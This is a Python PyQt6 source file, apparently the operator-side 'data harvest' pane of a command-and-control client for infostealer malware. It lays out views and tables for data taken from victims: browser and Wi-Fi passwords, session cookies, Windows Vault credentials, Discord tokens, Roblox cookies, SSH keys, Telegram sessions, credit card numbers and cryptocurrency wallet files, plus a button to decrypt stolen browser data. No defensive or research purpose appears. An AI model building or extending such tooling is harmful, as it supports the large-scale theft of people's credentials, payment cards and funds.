# C2_Client/ui/data_harvest_pane.py
from PyQt6.QtWidgets import (QWidget, QHBoxLayout, QListWidget, QStackedWidget, 
                             QVBoxLayout, QTableWidget, QTextEdit, 
                             QHeaderView, QTableWidgetItem, QAbstractItemView, QPushButton)
from PyQt6.QtCore import pyqtSignal

class DataHarvestPane(QWidget):
    decryption_requested = pyqtSignal()

    def __init__(self):
        super().__init__()
        
        main_layout = QHBoxLayout(self)
        
        # --- Left Pane: Category List ---
        left_pane_widget = QWidget()
        left_pane_layout = QVBoxLayout(left_pane_widget)
        left_pane_layout.setContentsMargins(0,0,0,0)
        left_pane_widget.setFixedWidth(240)

        self.category_list = QListWidget()
        self.categories = [
            "System Info", "Hardware Info", "Security Products", "Installed Applications", 
            "Running Processes", "Environment Variables", "Network Info", "Wi-Fi Passwords", 
            "Active Connections", "ARP Table", "DNS Cache", "Browser Passwords", 
            "Session Cookies", "Windows Vault Credentials", "Application Credentials", 
            "Discord Tokens", "Roblox Cookies", "SSH Keys", "Telegram Session Files", 
            "Credit Card Data", "Cryptocurrency Wallet Files", "Browser Autofill", 
            "Browser History", "Clipboard Contents", "Browser Files"
        ]
        self.category_list.addItems(self.categories)
        left_pane_layout.addWidget(self.category_list)

        self.decrypt_button = QPushButton("Decrypt Browser Data")
        self.decrypt_button.setObjectName("SanitizeButton") # Use the red button style
        self.decrypt_button.clicked.connect(self.decryption_requested.emit)
        left_pane_layout.addWidget(self.decrypt_button)
        main_layout.addWidget(left_pane_widget)
        
        # --- Right Pane: Content Display ---
        self.content_stack = QStackedWidget()
        main_layout.addWidget(self.content_stack, 1)
        
        # Create a view widget for each category and store it
        self.view_map = {
            "System Info": self._create_text_view(), "Hardware Info": self._create_text_view(),
            "Security Products": self._create_text_view(), "Installed Applications": self._create_text_view(is_mono=True),
            "Running Processes": self._create_table(["PID", "Name", "Username"]), "Environment Variables": self._create_text_view(is_mono=True),
            "Network Info": self._create_text_view(), "Wi-Fi Passwords": self._create_table(["SSID", "Password"]),
            "Active Connections": self._create_text_view(is_mono=True), "ARP Table": self._create_text_view(is_mono=True),
            "DNS Cache": self._create_text_view(is_mono=True), "Browser Passwords": self._create_table(["Browser", "URL", "Username", "Password"]),
            "Session Cookies": self._create_table(["Host", "Name", "Expires (UTC)", "Value"]), "Windows Vault Credentials": self._create_table(["Resource", "Username", "Password"]),
            "Application Credentials": self._create_table(["Host", "Port", "Username", "Password"]), "Discord Tokens": self._create_text_view(is_mono=True),
            "Roblox Cookies": self._create_text_view(is_mono=True), "SSH Keys": self._create_text_view(is_mono=True),
            "Telegram Session Files": self._create_text_view(), "Credit Card Data": self._create_table(["Name on Card", "Expires (MM/YY)", "Card Number"]),
            "Cryptocurrency Wallet Files": self._create_text_view(is_mono=True), "Browser Autofill": self._create_table(["Field Name", "Value"]),
            "Browser History": self._create_table(["URL", "Title", "Visit Count", "Last Visit (UTC)"]), "Clipboard Contents": self._create_text_view(is_mono=True),
            "Browser Files": self._create_text_view()
        }
        
        self.ordered_keys = list(self.view_map.keys())
        for key in self.ordered_keys:
            self.content_stack.addWidget(self.view_map[key])

        self.category_list.currentItemChanged.connect(self.on_category_change)
        if self.category_list.count() > 0:
            self.category_list.setCurrentRow(0)

    def on_category_change(self, current_item):
        """Switches the view in the QStackedWidget when a category is selected."""
        if not current_item: return
        index = self.category_list.row(current_item)
        if 0 <= index < len(self.ordered_keys):
            self.content_stack.setCurrentWidget(self.view_map[self.ordered_keys[index]])

    def _create_text_view(self, is_mono=False):
        """Helper to create a standardized QTextEdit for displaying text data."""
        text_edit = QTextEdit()
        text_edit.setReadOnly(True)
        if is_mono:
            text_edit.setFontFamily("Consolas")
        return text_edit

    def _create_table(self, headers):
        """Helper to create a standardized QTableWidget for displaying tabular data."""
        table = QTableWidget()
        table.setColumnCount(len(headers))
        table.setHorizontalHeaderLabels(headers)
        table.horizontalHeader().setSectionResizeMode(QHeaderView.ResizeMode.ResizeToContents)
        table.horizontalHeader().setStretchLastSection(True)
        table.setEditTriggers(QAbstractItemView.EditTrigger.NoEditTriggers)
        table.setSelectionBehavior(QAbstractItemView.SelectionBehavior.SelectRows)
        table.verticalHeader().setVisible(False)
        table.setSortingEnabled(True)
        return table

    def clear_all_views(self):
        """Resets all display widgets to their default state."""
        for view in self.view_map.values():
            if isinstance(view, QTextEdit):
                view.setText("Awaiting data...")
            elif isinstance(view, QTableWidget):
                view.setRowCount(0)

    def update_view(self, module_name, data):
        """The main method to populate a view with new data from the C2."""
        view_key = module_name.replace(" (Raw)", "")
        view = self.view_map.get(view_key)
        if not view: return

        status = data.get("status", "success")
        payload = data.get('data')
        
        if status == "error":
            if isinstance(view, QTextEdit): view.setText(f"Error harvesting this module:\n\n{payload}")
            return

        if view_key == "Browser Files":
            size_kb = len(payload.get("data", "")) / 1024 if payload else 0
            view.setText(f"Received browser data package.\n\nSize: {size_kb:.2f} KB\n\nClick 'Decrypt Browser Data' to process.")
            return

        if isinstance(view, QTextEdit):
            self._populate_text_view(view, payload)
        elif isinstance(view, QTableWidget):
            self._populate_table(view, payload)

    def _populate_text_view(self, view, data):
        if not data:
            view.setText("No data found.")
            return
        if isinstance(data, dict):
            html = "".join([f"<p><b>{key.replace('_', ' ').title()}:</b> {value}</p>" for key, value in data.items()])
            view.setHtml(html)
        elif isinstance(data, list):
            view.setText("\n".join(map(str, data)))
        else:
            view.setText(str(data))

    def _populate_table(self, table, data_list):
        table.setSortingEnabled(False)
        if not isinstance(data_list, list) or not data_list:
            table.setRowCount(0)
            table.setSortingEnabled(True)
            return
            
        table.setRowCount(len(data_list))
        header_map = {header.lower().replace(' ', '_'): i for i, header in enumerate([table.horizontalHeaderItem(j).text() for j in range(table.columnCount())])}
        
        for row_idx, row_data in enumerate(data_list):
            if isinstance(row_data, dict):
                normalized_data_keys = {k.lower().replace(' ', '_'): v for k, v in row_data.items()}
                for key, col_idx in header_map.items():
                    value = normalized_data_keys.get(key, '')
                    table.setItem(row_idx, col_idx, QTableWidgetItem(str(value)))
                    
        table.resizeColumnsToContents()
        table.setSortingEnabled(True)